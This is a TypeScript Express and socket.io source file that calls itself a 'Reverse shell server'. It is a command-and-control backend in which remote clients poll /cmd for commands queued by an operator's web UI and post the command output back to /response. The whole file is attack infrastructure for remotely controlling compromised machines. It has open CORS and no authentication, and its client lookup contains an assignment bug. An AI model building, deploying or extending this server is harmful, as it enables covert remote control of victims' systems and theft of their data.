import dotenv from "dotenv"
dotenv.config()

import express from "express"
import "express-async-errors"
import createHttpError from "http-errors"

import cors from "cors"
import http from "http"
// @ts-ignore
import socketio from "socket.io"

const { EXPRESS_PORT = 18000 } = process.env

process.env.TZ = "Asia/Tokyo"

const app = express()
app.use(express.urlencoded({ limit: "50mb", extended: true }))
app.use(cors())

const http_server = http.createServer(app)
const io = socketio(http_server)

type Client = {
  username: string
  command: string
  last_seen: Date
  response?: string
}

const clients: Client[] = []

app.get("/cmd", (req, res) => {
  const { username } = req.query as { username: string | undefined }
  if (!username) throw createHttpError(400, "username not provided")

  console.log(`${username} requested a command`)

  // Check if the client is known already
  let client = clients.find((c) => c.username === username)

  if (!client) {
    client = {
      username,
      command: "standby",
      last_seen: new Date(),
    }
    clients.push(client)
  }

  // timestamp the connection
  client.last_seen = new Date()

  // Send the client to the front end
  io.emit("request", client)

  // send the command to the client
  res.send(client.command)

  // Set the next command to standby, which does nothing on the client side
  client.command = "standby"
})

app.post("/response", (req, res) => {
  const { username, output } = req.body
  if (!username) throw createHttpError(400, "username not provided")

  console.log(`${username} provided a response`)
  res.send("OK")

  // Could execute next command here to increase speed
  const client = clients.find((c) => c.username === username)

  // if found
  if (client) {
    console.log(client)
    client.response = output
    io.emit("response", client)
  }
})

// TODO: POST /command from UI instead of WS

// TODO: update socket.io and type
io.on("connection", (socket: any) => {
  console.log("[WS] Socket.io client connected")

  socket.on("new_command", (payload: any) => {
    console.log("new command")
    const { username, command } = payload
    if (!username) return

    const client = clients.find((c) => (c.username = username))
    if (!client) return

    // set the new command
    client.command = command
  })
})

http_server.listen(EXPRESS_PORT, () =>
  console.log(`Reverse shell server listening on ${EXPRESS_PORT}`)
)
